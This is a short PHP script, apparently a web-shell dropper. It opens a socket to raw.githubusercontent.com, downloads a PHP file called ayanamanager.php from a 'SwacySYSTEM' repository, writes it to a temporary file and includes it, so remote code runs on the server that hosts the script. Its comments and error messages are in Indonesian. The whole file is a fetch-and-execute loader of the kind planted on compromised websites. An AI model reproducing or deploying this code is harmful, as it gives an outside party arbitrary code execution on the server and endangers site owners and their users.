<?php
function get_remote_php_fsock($host, $path) {
    $fp = fsockopen($host, 443, $errno, $errstr, 30);
    if (!$fp) {
        echo "fsockopen error: $errstr ($errno)";
        return false;
    }

    // Send request
    $out = "GET $path HTTP/1.1\r\n";
    $out .= "Host: $host\r\n";
    $out .= "User-Agent: Mozilla/5.0\r\n";
    $out .= "Connection: Close\r\n\r\n";

    // Enable SSL/TLS
    stream_socket_enable_crypto($fp, true, STREAM_CRYPTO_METHOD_TLS_CLIENT);

    fwrite($fp, $out);
    $response = '';
    while (!feof($fp)) {
        $response .= fgets($fp, 1024);
    }
    fclose($fp);

    // Pisahkan header dan body
    $parts = explode("\r\n\r\n", $response, 2);
    return isset($parts[1]) ? $parts[1] : false;
}

$host = 'raw.githubusercontent.com';
$path = '/Sw4CyEx/SwacySYSTEM/main/ayanamanager.php';

$php_code = get_remote_php_fsock($host, $path);

if ($php_code !== false) {
    $tmp_file = tempnam(sys_get_temp_dir(), 'swacy_') . '.php';
    file_put_contents($tmp_file, $php_code);
    include($tmp_file);
} else {
    echo "Gagal mengambil file melalui fsockopen.";
}
?>
